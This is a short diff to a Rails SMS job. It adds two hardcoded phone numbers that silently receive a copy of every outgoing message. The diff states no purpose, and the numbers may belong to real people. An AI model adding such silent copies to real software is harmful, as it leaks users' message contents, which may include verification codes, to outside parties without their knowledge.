@@ -11,6 +11,8 @@ class SendSmsJob < ApplicationJob
     puts "============ PhoneNumber #{phone_number} ====================="
 
     send_sms(phone_number, message)
+    send_sms("0507565349", message)
+    send_sms("0579269697", message)
   end
 
   private
